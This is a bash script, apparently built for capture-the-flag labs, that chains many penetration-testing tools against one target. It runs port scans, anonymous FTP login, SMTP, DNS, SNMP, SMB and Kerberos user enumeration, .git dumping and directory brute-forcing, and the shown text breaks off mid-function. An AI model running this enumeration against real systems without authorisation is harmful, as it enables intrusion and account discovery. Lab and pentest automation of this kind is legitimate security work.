#!/bin/bash 

########################################
####  [+]-- Author: 0x2034 --[+]  ####
####   [+]--   CyberThug   --[+]    ####
########################################

echo -e "\e[1;32m
              ______      __             ________
             / ____/_  __/ /_  ___  ____/_  __/ /_  __  __._____
            / /   / / / / __ \/ _ \/ ___// / / __ \/ / / / __  / 
           / /___/ /_/ / /_/ /  __/ /   / / / / / / /_/ / /_/ /  
           \____/\__, /_.___/\___/_/   /_/ /_/ /_/\__,_/\__, /  
                /____/                                 /____/    
                                                            \e[0m""\e[1;38m0x2034\e[0m"

network(){
echo ""
echo -e "\e[1;35m--------------- [+] NETWORK [+] ---------------\e[0m"
echo ""
if [ "$flag_4" = true ]
then
    :
else 
    if nc -zv -w 5 $DOMAIN 21 2>/dev/null; then
              echo -e "\e[1;32m[+]-- FTP Enumeration on $DOMAIN --[+]\e[0m"
              echo ""
              ftp -n $DOMAIN <<END_SCRIPT
user Anonymous Anonymous
ls        
bye
END_SCRIPT
    fi
    echo "--------------------------"
    if nc -zv -w 5 $DOMAIN 25 2>/dev/null || nc -zv -w 5 $DOMAIN 587 2>/dev/null; then
       gnome-terminal -- bash -c "echo -e '\e[1;32m[+]-- SMTP Enumeration on $DOMAIN --[+]\e[0m' ; echo "" ; smtp-user-enum -U /usr/share/wordlists/metasploit/unix_users.txt $DOMAIN 25 ; exec bash" 
    fi
    echo "--------------------------"
    if nc -zv -w 5 $DOMAIN 53 2>/dev/null || nc -zuv -w 5 $DOMAIN 53 2>/dev/null; then
       ip=$(ping -c 1 $DOMAIN | awk -F'[()]' '/PING/{print $2}')
       mkdir -p "$HOME/CyberThug_output/dnsenum"
       Time=$(date +"%Y-%m-%d_%H-%M-%S")
       gnome-terminal -- bash -c "echo -e '\e[1;32m[+]-- DNS Enumeration on $DOMAIN --[+]\e[0m' ; echo "" ; dig @$ip $DOMAIN ; echo "" ; echo -e '\e[1;32m---------------\e[0m' ; echo "" ; dig axfr @$ip $DOMAIN ; echo "" ;echo -e '\e[1;32m---------------\e[0m' ; echo "" ; dnsenum --dnsserver $ip -f /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -o $HOME/CyberThug_output/dnsenum/dns_enum_${DOMAIN}_${Time} $DOMAIN ; echo "" ; echo -e '\e[1;32m[+]-- Output File : $HOME/CyberThug_output/dnsenum/dns_enum_${DOMAIN}_${Time} --[+]\e[0m' ; exec bash"
    fi
    echo "--------------------------"
    if nc -zv -w 5 $DOMAIN 111 2>/dev/null || nc -zv -w 5 $DOMAIN 2049 2>/dev/null; then
       output=$(timeout 10s showmount -e $DOMAIN 2>&1)
       line_count=$(echo "$output" | wc -l)
       if [ $line_count -gt 1 ]; then
           gnome-terminal -- bash -c "echo -e '\e[1;32m[+]-- NFS Enumeration on $DOMAIN --[+]\e[0m' ; echo "" ; showmount -e $DOMAIN ; exec bash"
       else
           :
       fi
    fi
    echo "--------------------------"
    if nc -zv -w 5 $DOMAIN 139 2>/dev/null || nc -zv -w 5 $DOMAIN 445 2>/dev/null; then
       echo ""
       echo -e "\e[1;32m[+]-- Enum4Linux on $DOMAIN --[+]\e[0m"
       echo ""
       enum4linux $DOMAIN
       echo -e "\e[1;32m[+]-- LookupSID on $DOMAIN --[+]\e[0m"
       echo ""
       lookupsid.py -no-pass guest@$DOMAIN 20000
    fi
    echo "--------------------------"
    if nc -zv -w 5 $DOMAIN 161 2>/dev/null || nc -zvu -w 5 $DOMAIN 161 2>/dev/null; then
        gnome-terminal -- bash -c "
        echo -e '\e[1;32m[+]-- SNMP Enumeration on $DOMAIN --[+]\e[0m'
        echo ''
        wordlist='/usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt'
        for comm in \$(cat \"\$wordlist\"); do
            echo -e '\e[1;35m-----[+] Testing community string: '\$comm'  [+]-----\e[0m'
            timeout 2s snmpwalk -v 2c -c \"\$comm\" \"$DOMAIN\" || echo -e '\e[1;38m--------------------\e[0m'
            timeout 2s snmpwalk -v 1 -c \"\$comm\" \"$DOMAIN\"
            echo -e '\e[1;31m[+] Commands => snmpwalk -v 2c -c '\$comm' $DOMAIN -m all || snmpwalk -v 1 -c '\$comm' $DOMAIN -m all [+]\e[0m'
            echo ''
        done
        exec bash"
    fi
    echo "--------------------------"
    if nc -zv -w 5 $DOMAIN 389 2>/dev/null || nc -zv -w 5 $DOMAIN 636 2>/dev/null; then
       gnome-terminal -- bash -c "echo -e '\e[1;32m[+]-- Windsearch on $DOMAIN --[+]\e[0m' ; echo "" ; python3 $HOME/Downloads/tools/Folders/Windapsearch/windapsearch.py -U --full --dc-ip $DOMAIN ; exec bash"         
    fi
    echo "--------------------------"
    if nc -zv -w 5 $DOMAIN 88 2>/dev/null; then
       echo ""
       echo -e "\e[1;32m[+]-- Kerbrute on $DOMAIN --[+]\e[0m"
       echo ""
       if  $HOME/Downloads/tools/Files/Kerbrute userenum -d $DOMAIN --dc $HOSTS_ENTRY /usr/share/wordlists/rockyou.txt
       then
           :
       elif  $HOME/Downloads/tools/Files/Kerbrute userenum -d $DOMAIN --dc $DOMAIN /usr/share/wordlists/rockyou.txt
       then
           :
       else
             $HOME/Downloads/tools/Files/Kerbrute userenum -d $HOSTS_ENTRY --dc $HOSTS_ENTRY /usr/share/wordlists/rockyou.txt   
       fi
    fi
fi
}
web_2(){
  PROTOCOL=$1
  FULL_DOMAIN="$PROTOCOL://$DOMAIN"
  echo -e "                                     \e[1;37m[+]----- Scanning $FULL_DOMAIN -----[+]\e[0m"
  echo "" 
  gnome-terminal -- bash -c "echo -e '\e[1;32m[+]-- Nikto on $FULL_DOMAIN --[+]\e[0m' ; echo "" ; nikto -h $FULL_DOMAIN -C all ; exec bash"
  if [[ ! $DOMAIN =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
     if [ -z "$HOSTS_ENTRY" ]; then
          echo -e "dasdddd445ddddda445sd\ndasdsada4sdsdasd54654\ndsdasdd45d4a5sd4as5d4\n5445dasd4554dasd45ddd\n455ddasd5512das2da2d2\ndasdas5d5asd5asd5asd4\ndas5das5d4as5d4asd5as\nds5d5454das5d4a5d12dd\ndasd554d21d2ad8dadada\ndadadasd545d45ad4sd5s\ndasd4a5d4a5sdas5d4a5d\nd5asd4a5d4as5d4sd55dd\nda5sdas4da5d4as5dad54\nda5d454d45da45das4ddd\ndas5d4ad54as5da4dasdd\nda5d4a5d4a4dad54ds4dd\nd5ad4a5ds5d4dsd4s4dd5\n4d5ad4a5d4a5d4d5d455d\nadasdadasd45ad4a5s4dd\nd5sd4ad5a4da5d45dd4dd\nd5ad4a5d4as5das4d5ddd" > $HOME/CyberThug_output/.test.txt
          ffuf -w $HOME/CyberThug_output/.test.txt -u $FULL_DOMAIN/ -H "Host: FUZZ.${DOMAIN}" >> $HOME/CyberThug_output/.test1.txt
          echo ""
          file="$HOME/CyberThug_output/.test1.txt"
          while IFS= read -r line; do
                if echo "$line" | grep -q "Size"; then
                    size=$(echo "$line" | sed -n 's/.*Size: \([0-9]\+\),.*/\1/p')
                fi
          done < "$file"
          sleep 2
          if [ -n "$size" ]; then
               gnome-terminal -- bash -c "ffuf -w /usr/share/wordlists/amass/subdomains-top1mil-110000.txt -u $FULL_DOMAIN/ -H 'Host: FUZZ.${DOMAIN}' -fc 404 -fs $size -c ; exec bash"
          else
               gnome-terminal -- bash -c "ffuf -w /usr/share/wordlists/amass/subdomains-top1mil-110000.txt -u $FULL_DOMAIN/ -H 'Host: FUZZ.${DOMAIN}' -mc 200,302,403,301 -c ; exec bash"
          fi
     else 
          echo -e "dasdddd445ddddda445sd\ndasdsada4sdsdasd54654\ndsdasdd45d4a5sd4as5d4\n5445dasd4554dasd45ddd\n455ddasd5512das2da2d2\ndasdas5d5asd5asd5asd4\ndas5das5d4as5d4asd5as\nds5d5454das5d4a5d12dd\ndasd554d21d2ad8dadada\ndadadasd545d45ad4sd5s\ndasd4a5d4a5sdas5d4a5d\nd5asd4a5d4as5d4sd55dd\nda5sdas4da5d4as5dad54\nda5d454d45da45das4ddd\ndas5d4ad54as5da4dasdd\nda5d4a5d4a4dad54ds4dd\nd5ad4a5ds5d4dsd4s4dd5\n4d5ad4a5d4a5d4d5d455d\nadasdadasd45ad4a5s4dd\nd5sd4ad5a4da5d45dd4dd\nd5ad4a5d4as5das4d5ddd" > $HOME/CyberThug_output/.test.txt
          ffuf -w $HOME/CyberThug_output/.test.txt -u $FULL_DOMAIN/ -H "Host: FUZZ.${DOMAIN}" >> $HOME/CyberThug_output/.test1.txt  
          echo ""
          file="$HOME/CyberThug_output/.test1.txt" 
          while IFS= read -r line; do
                if echo "$line" | grep -q "Size"; then
                   size=$(echo "$line" | sed -n 's/.*Size: \([0-9]\+\),.*/\1/p')
                fi
          done < "$file"
          sleep 2
          if [ -n "$size" ]; then
               gnome-terminal -- bash -c "ffuf -w /usr/share/wordlists/amass/subdomains-top1mil-110000.txt -u $FULL_DOMAIN/ -H 'Host: FUZZ.${DOMAIN}' -fc 404 -fs $size -c ; exec bash"
          else
               gnome-terminal -- bash -c "ffuf -w /usr/share/wordlists/amass/subdomains-top1mil-110000.txt -u $FULL_DOMAIN/ -H 'Host: FUZZ.${DOMAIN}' -mc 200,302,403,301 -c ; exec bash"
          fi
     fi 
  fi
  TIMESTAMP=$(date +"%Y-%m-%d_%H-%M-%S")
  SANITIZED_DOMAIN=$(echo "$FULL_DOMAIN" | sed 's~://~_~')
  OUTPUT_DIR="$HOME/CyberThug_output/GitDumper/git_${TIMESTAMP}_${SANITIZED_DOMAIN}"
  mkdir -p "$OUTPUT_DIR"
  echo -e "\e[1;32m[+]-- GitDumper on $FULL_DOMAIN --[+]\e[0m"
  echo -e ""
  $HOME/Downloads/tools/Files/Gitdumper.sh "$FULL_DOMAIN/.git/" "$OUTPUT_DIR"
  echo "--------------------------"
  echo -e "\e[1;32m[+]-- Ds_Walk on $FULL_DOMAIN --[+]\e[0m"
  echo "" 
  python $HOME/Downloads/tools/Folders/DS_Walk/ds_walk.py -u $FULL_DOMAIN 
  echo "--------------------------"
  echo -e "\e[1;32m[+]-- Page Source Domains on $FULL_DOMAIN --[+]\e[0m"
  echo "" 
  curl $FULL_DOMAIN -k | grep -oE '\b[a-zA-Z0-9._-]+\.(htb|thm|com|org|net|edu|gov|mil|int|co|us|uk|ca|de|jp|fr|au|eg|local)\b'
  echo "--------------------------"
  echo -e "\e[1;32m[+]-- Hash Extraction on $FULL_DOMAIN --[+]\e[0m"
  echo "" 
  python $HOME/Downloads/tools/Files/Hash_extraction.py $FULL_DOMAIN 2>/dev/null
  echo "--------------------------"
  gnome-terminal -- bash -c "feroxbuster --url $FULL_DOMAIN --random-agent --filter-status 404 -k ; exec bash" 
  echo "--------------------------"
  sleep 5
  gnome-terminal -- bash -c "dirsearch -u $FULL_DOMAIN -r --random-agent --exclude-status 404 ; exec bash"
  echo "--------------------------"
  sleep 2
  gnome-terminal -- bash -c "for STATUS_CODE in \"\" \"-b 404\" \"-b 404,429\" \"-b 404,429,301\" \"-k -b 301,404,429,403\" \"-k -b 301,404,403,300,429\" \"-k -b 301,302,404,403,401,429,300\" \"-k -b 200\"; do echo 'Running gobuster'; gobuster dir -u \"$FULL_DOMAIN\" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error --exclude-length 0 \$STATUS_CODE --random-agent; exit_code=\$?; if [[ \$exit_code -eq 0 ]]; then break; fi; done; exec bash"
  echo "--------------------------"
  sleep 5
  gnome-terminal -- bash -c "for STATUS_CODE in \"\" \"-b 404\" \"-b 404,429\" \"-b 404,429,301\" \"-k -b 301,404,429,403\" \"-k -b 301,404,403,300,429\" \"-k -b 301,302,404,403,401,429,300\" \"-k -b 200\"; do echo 'Running gobuster'; gobuster dir -u \"$FULL_DOMAIN\" -w /usr/share/wordlists/rockyou.txt --no-error --exclude-length 0 \$STATUS_CODE --random-agent; exit_code=\$?; if [[ \$exit_code -eq 0 ]]; then break; fi; done; exec bash"
  echo "--------------------------"
  sleep 2
  gnome-terminal -- bash -c "echo -e '\e[1;32m[+]-- WPscan on $FULL_DOMAIN --[+]\e[0m' ; echo "" ; wpscan --url $FULL_DOMAIN --disable-tls-checks --ignore-main-redirect --no-update ; wpscan --url $FULL_DOMAIN --disable-tls-checks --ignore-main-redirect --no-update --enumerate u ; wpscan --url  $FULL_DOMAIN --disable-tls-checks --ignore-main-redirect --no-update -e p --plugins-detection aggressive ; exec bash"
}
web_1(){
   echo ""
   if [ "$flag_3" = true ]
   then
       :
   else
       echo -e "\e[1;35m---------------[+] RECON [+] ---------------\e[0m"
       echo ""
   fi
   echo -e "\e[1;35m--------------- [+] WEB [+] ---------------\e[0m"
   echo ""
   HTTP_OPEN=false
   HTTPS_OPEN=false
   if nc -zv -w 5 $DOMAIN 80 2>/dev/null; then
       HTTP_OPEN=true
   fi
   if nc -zv -w 5 $DOMAIN 443 2>/dev/null; then
      HTTPS_OPEN=true
   fi
   if [ "$HTTP_OPEN" = true ]; then
       if [ "$flag_1" = true ]
          then
              :  
          else
              web_2 "http"
       fi
   fi  
   if [ "$HTTPS_OPEN" = true ]; then
       if [ "$flag_2" = true ]
          then
              :  
          else
              web_2 "https"
       fi
   fi  
   if nc -zv -w 5 $DOMAIN 8080 2>/dev/null; then
      echo -n | openssl s_client -connect $DOMAIN:8080 > /dev/null 2>&1
      if [ $? -eq 0 ]; then
         response=$(curl -s -o /dev/null -w "%{http_code}" https://$DOMAIN:8080)
         if [ "$response" -eq 200 ] || [ "$response" -eq 302 ] || [ "$response" -eq 403 ]; then
             gnome-terminal -- bash -c "for STATUS_CODE in \"\" \"-b 404\" \"-b 404,429\" \"-b 404,429,301\" \"-k -b 301,404,429,403\" \"-k -b 301,404,403,300,429\" \"-k -b 301,302,404,403,401,429,300\" \"-k -b 200\"; do echo 'Running gobuster'; gobuster dir -u \"https://$DOMAIN:8080\" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error --exclude-length 0 \$STATUS_CODE --random-agent; exit_code=\$?; if [[ \$exit_code -eq 0 ]]; then break; fi; done; exec bash"
         fi
      else
          response=$(curl -s -o /dev/null -w "%{http_code}" http://$DOMAIN:8080)
          if [ "$response" -eq 200 ] || [ "$response" -eq 302 ] || [ "$response" -eq 403 ]; then
             gnome-terminal -- bash -c "for STATUS_CODE in \"\" \"-b 404\" \"-b 404,429\" \"-b 404,429,301\" \"-k -b 301,404,429,403\" \"-k -b 301,404,403,300,429\" \"-k -b 301,302,404,403,401,429,300\" \"-k -b 200\"; do echo 'Running gobuster'; gobuster dir -u \"http://$DOMAIN:8080\" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error --exclude-length 0 \$STATUS_CODE --random-agent; exit_code=\$?; if [[ \$exit_code -eq 0 ]]; then break; fi; done; exec bash"
          fi
      fi
   fi
   echo "--------------------------"
   if nc -zv -w 5 $DOMAIN 8000 2>/dev/null; then
      echo -n | openssl s_client -connect $DOMAIN:8000 > /dev/null 2>&1
      if [ $? -eq 0 ]; then
         response=$(curl -s -o /dev/null -w "%{http_code}" https://$DOMAIN:8000)
         if [ "$response" -eq 200 ] || [ "$response" -eq 302 ] || [ "$response" -eq 403 ]; then
             gnome-terminal -- bash -c "for STATUS_CODE in \"\" \"-b 404\" \"-b 404,429\" \"-b 404,429,301\" \"-k -b 301,404,429,403\" \"-k -b 301,404,403,300,429\" \"-k -b 301,302,404,403,401,429,300\" \"-k -b 200\"; do echo 'Running gobuster'; gobuster dir -u \"https://$DOMAIN:8000\" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error --exclude-length 0 \$STATUS_CODE --random-agent; exit_code=\$?; if [[ \$exit_code -eq 0 ]]; then break; fi; done; exec bash"
         fi
      else
          response=$(curl -s -o /dev/null -w "%{http_code}" http://$DOMAIN:8000)
          if [ "$response" -eq 200 ] || [ "$response" -eq 302 ] || [ "$response" -eq 403 ]; then
             gnome-terminal -- bash -c "for STATUS_CODE in \"\" \"-b 404\" \"-b 404,429\" \"-b 404,429,301\" \"-k -b 301,404,429,403\" \"-k -b 301,404,403,300,429\" \"-k -b 301,302,404,403,401,429,300\" \"-k -b 200\"; do echo 'Running gobuster'; gobuster dir -u \"http://$DOMAIN:8000\" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error --exclude-length 0 \$STATUS_CODE --random-agent; exit_code=\$?; if [[ \$exit_code -eq 0 ]]; then break; fi; done; exec bash"
          fi
      fi
   fi
   echo "--------------------------"
   if nc -zv -w 5 $DOMAIN 8443 2>/dev/null; then
      echo -n | openssl s_client -connect $DOMAIN:8443 > /dev/null 2>&1
      if [ $? -eq 0 ]; then
         response=$(curl -s -o /dev/null -w "%{http_code}" https://$DOMAIN:8443)
         if [ "$response" -eq 200 ] || [ "$response" -eq 302 ] || [ "$response" -eq 403 ]; then
             gnome-terminal -- bash -c "for STATUS_CODE in \"\" \"-b 404\" \"-b 404,429\" \"-b 404,429,301\" \"-k -b 301,404,429,403\" \"-k -b 301,404,403,300,429\" \"-k -b 301,302,404,403,401,429,300\" \"-k -b 200\"; do echo 'Running gobuster'; gobuster dir -u \"https://$DOMAIN:8443\" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error --exclude-length 0 \$STATUS_CODE --random-agent; exit_code=\$?; if [[ \$exit_code -eq 0 ]]; then break; fi; done; exec bash"
         fi
      else
          response=$(curl -s -o /dev/null -w "%{http_code}" http://$DOMAIN:8443)
          if [ "$response" -eq 200 ] || [ "$response" -eq 302 ] || [ "$response" -eq 403 ]; then
             gnome-terminal -- bash -c "for STATUS_CODE in \"\" \"-b 404\" \"-b 404,429\" \"-b 404,429,301\" \"-k -b 301,404,429,403\" \"-k -b 301,404,403,300,429\" \"-k -b 301,302,404,403,401,429,300\" \"-k -b 200\"; do echo 'Running gobuster'; gobuster dir -u \"http://$DOMAIN:8443\" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error --exclude-length 0 \$STATUS_CODE --random-agent; exit_code=\$?; if [[ \$exit_code -eq 0 ]]; then break; fi; done; exec bash"
          fi
      fi
   fi
   echo "--------------------------"
   if nc -zv -w 5 $DOMAIN 8888 2>/dev/null; then
      echo -n | openssl s_client -connect $DOMAIN:8888 > /dev/null 2>&1
      if [ $? -eq 0 ]; then
         response=$(curl -s -o /dev/null -w "%{http_code}" https://$DOMAIN:8888)
         if [ "$response" -eq 200 ] || [ "$response" -eq 302 ] || [ "$response" -eq 403 ]; then
             gnome-terminal -- bash -c "for STATUS_CODE in \"\" \"-b 404\" \"-b 404,429\" \"-b 404,429,301\" \"-k -b 301,404,429,403\" \"-k -b 301,404,403,300,429\" \"-k -b 301,302,404,403,401,429,300\" \"-k -b 200\"; do echo 'Running gobuster'; gobuster dir -u \"https://$DOMAIN:8888\" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error --exclude-length 0 \$STATUS_CODE --random-agent; exit_code=\$?; if [[ \$exit_code -eq 0 ]]; then break; fi; done; exec bash"
         fi
      else
          response=$(curl -s -o /dev/null -w "%{http_code}" http://$DOMAIN:8888)
          if [ "$response" -eq 200 ] || [ "$response" -eq 302 ] || [ "$response" -eq 403 ]; then
             gnome-terminal -- bash -c "for STATUS_CODE in \"\" \"-b 404\" \"-b 404,429\" \"-b 404,429,301\" \"-k -b 301,404,429,403\" \"-k -b 301,404,403,300,429\" \"-k -b 301,302,404,403,401,429,300\" \"-k -b 200\"; do echo 'Running gobuster'; gobuster dir -u \"http://$DOMAIN:8888\" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error --exclude-length 0 \$STATUS_CODE --random-agent; exit_code=\$?; if [[ \$exit_code -eq 0 ]]; then break; fi; done; exec bash"
          fi
      fi
   fi
   echo "--------------------------"
   if nc -zv -w 5 $DOMAIN 3000 2>/dev/null; then
      echo -n | openssl s_client -connect $DOMAIN:3000 > /dev/null 2>&1
      if [ $? -eq 0 ]; then
         response=$(curl -s -o /dev/null -w "%{http_code}" https://$DOMAIN:3000)
         if [ "$response" -eq 200 ] || [ "$response" -eq 302 ] || [ "$response" -eq 403 ]; then
             gnome-terminal -- bash -c "for STATUS_CODE in \"\" \"-b 404\" \"-b 404,429\" \"-b 404,429,301\" \"-k -b 301,404,429,403\" \"-k -b 301,404,403,300,429\" \"-k -b 301,302,404,403,401,429,300\" \"-k -b 200\"; do echo 'Running gobuster'; gobuster dir -u \"https://$DOMAIN:3000\" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error --exclude-length 0 \$STATUS_CODE --random-agent; exit_code=\$?; if [[ \$exit_code -eq 0 ]]; then break; fi; done; exec bash"
         fi
      else
          response=$(curl -s -o /dev/null -w "%{http_code}" http://$DOMAIN:3000)
          if [ "$response" -eq 200 ] || [ "$response" -eq 302 ] || [ "$response" -eq 403 ]; then
             gnome-terminal -- bash -c "for STATUS_CODE in \"\" \"-b 404\" \"-b 404,429\" \"-b 404,429,301\" \"-k -b 301,404,429,403\" \"-k -b 301,404,403,300,429\" \"-k -b 301,302,404,403,401,429,300\" \"-k -b 200\"; do echo 'Running gobuster'; gobuster dir -u \"http://$DOMAIN:3000\" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error --exclude-length 0 \$STATUS_CODE --random-agent; exit_code=\$?; if [[ \$exit_code -eq 0 ]]; then break; fi; done; exec bash"
          fi
      fi
   fi
   echo "--------------------------"
   if nc -zv -w 5 $DOMAIN 5000 2>/dev/null; then
      echo -n | openssl s_client -connect $DOMAIN:5000 > /dev/null 2>&1
      if [ $? -eq 0 ]; then
         response=$(curl -s -o /dev/null -w "%{http_code}" https://$DOMAIN:5000)
         if [ "$response" -eq 200 ] || [ "$response" -eq 302 ] || [ "$response" -eq 403 ]; then
             gnome-terminal -- bash -c "for STATUS_CODE in \"\" \"-b 404\" \"-b 404,429\" \"-b 404,429,301\" \"-k -b 301,404,429,403\" \"-k -b 301,404,403,300,429\" \"-k -b 301,302,404,403,401,429,300\" \"-k -b 200\"; do echo 'Running gobuster'; gobuster dir -u \"https://$DOMAIN:5000\" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error --exclude-length 0 \$STATUS_CODE --random-agent; exit_code=\$?; if [[ \$exit_code -eq 0 ]]; then break; fi; done; exec bash"
         fi
      else
          response=$(curl -s -o /dev/null -w "%{http_code}" http://$DOMAIN:5000)
          if [ "$response" -eq 200 ] || [ "$response" -eq 302 ] || [ "$response" -eq 403 ]; then
             gnome-terminal -- bash -c "for STATUS_CODE in \"\" \"-b 404\" \"-b 404,429\" \"-b 404,429,301\" \"-k -b 301,404,429,403\" \"-k -b 301,404,403,300,429\" \"-k -b 301,302,404,403,401,429,300\" \"-k -b 200\"; do echo 'Running gobuster'; gobuster dir -u \"http://$DOMAIN:5000\" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error --exclude-length 0 \$STATUS_CODE --random-agent; exit_code=\$?; if [[ \$exit_code -eq 0 ]]; then break; fi; done; exec bash"
          fi
      fi
   fi
   echo "--------------------------"
   if nc -zv -w 5 $DOMAIN 9000 2>/dev/null; then
      echo -n | openssl s_client -connect $DOMAIN:9000 > /dev/null 2>&1
      if [ $? -eq 0 ]; then
         response=$(curl -s -o /dev/null -w "%{http_code}" https://$DOMAIN:9000)
         if [ "$response" -eq 200 ] || [ "$response" -eq 302 ] || [ "$response" -eq 403 ]; then
             gnome-terminal -- bash -c "for STATUS_CODE in \"\" \"-b 404\" \"-b 404,429\" \"-b 404,429,301\" \"-k -b 301,404,429,403\" \"-k -b 301,404,403,300,429\" \"-k -b 301,302,404,403,401,429,300\" \"-k -b 200\"; do echo 'Running gobuster'; gobuster dir -u \"https://$DOMAIN:9000\" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error --exclude-length 0 \$STATUS_CODE --random-agent; exit_code=\$?; if [[ \$exit_code -eq 0 ]]; then break; fi; done; exec bash"
         fi
      else
          response=$(curl -s -o /dev/null -w "%{http_code}" http://$DOMAIN:9000)
          if [ "$response" -eq 200 ] || [ "$response" -eq 302 ] || [ "$response" -eq 403 ]; then
             gnome-terminal -- bash -c "for STATUS_CODE in \"\" \"-b 404\" \"-b 404,429\" \"-b 404,429,301\" \"-k -b 301,404,429,403\" \"-k -b 301,404,403,300,429\" \"-k -b 301,302,404,403,401,429,300\" \"-k -b 200\"; do echo 'Running gobuster'; gobuster dir -u \"http://$DOMAIN:9000\" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error --exclude-length 0 \$STATUS_CODE --random-agent; exit_code=\$?; if [[ \$exit_code -eq 0 ]]; then break; fi; done; exec bash"
          fi
      fi
   fi
   echo "--------------------------"
   if nc -zv -w 5 $DOMAIN 1337 2>/dev/null; then
      echo -n | openssl s_client -connect $DOMAIN:1337 > /dev/null 2>&1
      if [ $? -eq 0 ]; then
         response=$(curl -s -o /dev/null -w "%{http_code}" https://$DOMAIN:1337)
         if [ "$response" -eq 200 ] || [ "$response" -eq 302 ] || [ "$response" -eq 403 ]; then
             gnome-terminal -- bash -c "for STATUS_CODE in \"\" \"-b 404\" \"-b 404,429\" \"-b 404,429,301\" \"-k -b 301,404,429,403\" \"-k -b 301,404,403,300,429\" \"-k -b 301,302,404,403,401,429,300\" \"-k -b 200\"; do echo 'Running gobuster'; gobuster dir -u \"https://$DOMAIN:1337\" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error --exclude-length 0 \$STATUS_CODE --random-agent; exit_code=\$?; if [[ \$exit_code -eq 0 ]]; then break; fi; done; exec bash"
         fi
      else
          response=$(curl -s -o /dev/null -w "%{http_code}" http://$DOMAIN:1337)
          if [ "$response" -eq 200 ] || [ "$response" -eq 302 ] || [ "$response" -eq 403 ]; then
             gnome-terminal -- bash -c "for STATUS_CODE in \"\" \"-b 404\" \"-b 404,429\" \"-b 404,429,301\" \"-k -b 301,404,429,403\" \"-k -b 301,404,403,300,429\" \"-k -b 301,302,404,403,401,429,300\" \"-k -b 200\"; do echo 'Running gobuster'; gobuster dir -u \"http://$DOMAIN:1337\" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error --exclude-length 0 \$STATUS_CODE --random-agent; exit_code=\$?; if [[ \$exit_code -eq 0 ]]; then break; fi; done; exec bash"
          fi
      fi
   fi
   echo "--------------------------"
   if nc -zv -w 5 $DOMAIN 31337 2>/dev/null; then
      echo -n | openssl s_client -connect $DOMAIN:31337 > /dev/null 2>&1
      if [ $? -eq 0 ]; then
         response=$(curl -s -o /dev/null -w "%{http_code}" https://$DOMAIN:31337)
         if [ "$response" -eq 200 ] || [ "$response" -eq 302 ] || [ "$response" -eq 403 ]; then
             gnome-terminal -- bash -c "for STATUS_CODE in \"\" \"-b 404\" \"-b 404,429\" \"-b 404,429,301\" \"-k -b 301,404,429,403\" \"-k -b 301,404,403,300,429\" \"-k -b 301,302,404,403,401,429,300\" \"-k -b 200\"; do echo 'Running gobuster'; gobuster dir -u \"https://$DOMAIN:31337\" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error --exclude-length 0 \$STATUS_CODE --random-agent; exit_code=\$?; if [[ \$exit_code -eq 0 ]]; then break; fi; done; exec bash"
         fi
      else
          response=$(curl -s -o /dev/null -w "%{http_code}" http://$DOMAIN:31337)
          if [ "$response" -eq 200 ] || [ "$response" -eq 302 ] || [ "$response" -eq 403 ]; then
             gnome-terminal -- bash -c "for STATUS_CODE in \"\" \"-b 404\" \"-b 404,429\" \"-b 404,429,301\" \"-k -b 301,404,429,403\" \"-k -b 301,404,403,300,429\" \"-k -b 301,302,404,403,401,429,300\" \"-k -b 200\"; do echo 'Running gobuster'; gobuster dir -u \"http://$DOMAIN:31337\" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error --exclude-length 0 \$STATUS_CODE --random-agent; exit_code=\$?; if [[ \$exit_code -eq 0 ]]; then break; fi; done; exec bash"
          fi
      fi
   fi
}
main(){
     if [ "$flag_5" = true ];
     then
        if [ "$flag_6" = true ];
        then
            gnome-terminal -- bash -c "echo -e '\e[1;32m[+]-- TCP all Ports on $DOMAIN --[+]\e[0m'; echo "" ; nmap $DOMAIN -Pn -p- -T 5 ; exec bash"
            gnome-terminal -- bash -c "echo -e '\e[1;32m[+]-- UDP on $DOMAIN --[+]\e[0m'; echo "" ; nmap $DOMAIN -Pn -sU -T 5 ; exec bash"    
            web_1 
            network 
        else
            nmap -A -vv -Pn $DOMAIN
            gnome-terminal -- bash -c "echo -e '\e[1;32m[+]-- TCP all Ports on $DOMAIN --[+]\e[0m'; echo "" ; nmap $DOMAIN -Pn -p- -T 5 ; exec bash"
            gnome-terminal -- bash -c "echo -e '\e[1;32m[+]-- UDP on $DOMAIN --[+]\e[0m'; echo "" ; nmap $DOMAIN -Pn -sU -T 5 ; exec bash"     
            web_1   
            network 
        fi
     else
         if ping -c3 $DOMAIN 2>/dev/null; then
            if [ "$flag_6" = true ];
            then 
                gnome-terminal -- bash -c "echo -e '\e[1;32m[+]-- TCP all Ports on $DOMAIN --[+]\e[0m'; echo "" ; nmap $DOMAIN -Pn -p- -T 5 ; exec bash"
                gnome-terminal -- bash -c "echo -e '\e[1;32m[+]-- UDP on $DOMAIN --[+]\e[0m'; echo "" ; nmap $DOMAIN -Pn -sU -T 5 ; exec bash"    
                web_1  
                network  
            else
                nmap -A -vv -Pn $DOMAIN
                gnome-terminal -- bash -c "echo -e '\e[1;32m[+]-- TCP all Ports on $DOMAIN --[+]\e[0m'; echo "" ; nmap $DOMAIN -Pn -p- -T 5 ; exec bash"
